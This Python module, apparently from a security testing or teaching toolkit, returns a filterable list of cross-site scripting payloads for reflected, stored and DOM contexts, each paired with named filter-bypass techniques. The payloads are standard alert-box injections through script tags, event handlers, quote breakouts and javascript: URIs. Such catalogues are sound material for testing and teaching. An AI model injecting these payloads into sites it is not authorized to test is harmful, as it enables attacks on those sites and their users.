# modules/xss.py

def generate_xss(context=None, xss_type=None):
    """
    Generate educational XSS payload templates.
    Supports:
    - Types: reflected, stored, dom
    - Contexts: html, attribute, js
    """

    payloads = [

        # REFLECTED XSS
        {
            "id": "XSS-REF-HTML-001",
            "type": "reflected",
            "context": "html",
            "payload": "<script>alert('XSS')</script>",
            "description": "Basic reflected XSS in HTML context",
            "bypass_techniques": ["encoding", "case manipulation", "tag switching"]
        },

        {
            "id": "XSS-REF-ATTR-001",
            "type": "reflected",
            "context": "attribute",
            "payload": "\" onmouseover=\"alert('XSS')",
            "description": "Attribute context injection by breaking out of quotes",
            "bypass_techniques": ["quote escaping", "encoding"]
        },

        {
            "id": "XSS-REF-JS-001",
            "type": "reflected",
            "context": "js",
            "payload": "'; alert('XSS');//",
            "description": "JavaScript context string breakout",
            "bypass_techniques": ["string termination", "comment injection"]
        },

        # STORED XSS
        {
            "id": "XSS-STO-HTML-001",
            "type": "stored",
            "context": "html",
            "payload": "<img src=x onerror=alert('XSS')>",
            "description": "Stored XSS using image error event",
            "bypass_techniques": ["event handler abuse", "case manipulation"]
        },

        {
            "id": "XSS-STO-ATTR-001",
            "type": "stored",
            "context": "attribute",
            "payload": "\" autofocus onfocus=alert('XSS')",
            "description": "Stored XSS via attribute injection",
            "bypass_techniques": ["attribute injection", "whitespace abuse"]
        },

        # DOM-BASED XSS
        {
            "id": "XSS-DOM-JS-001",
            "type": "dom",
            "context": "js",
            "payload": "javascript:alert('XSS')",
            "description": "DOM-based XSS via unsafe JavaScript handling",
            "bypass_techniques": ["protocol abuse", "encoding"]
        },

        {
            "id": "XSS-DOM-HTML-001",
            "type": "dom",
            "context": "html",
            "payload": "<svg onload=alert('XSS')>",
            "description": "DOM XSS using SVG onload event",
            "bypass_techniques": ["tag switching", "event handler injection"]
        }
    ]

# Filtering logic

    if xss_type:
        payloads = [p for p in payloads if p["type"] == xss_type]

    if context:
        payloads = [p for p in payloads if p["context"] == context]

    return payloads
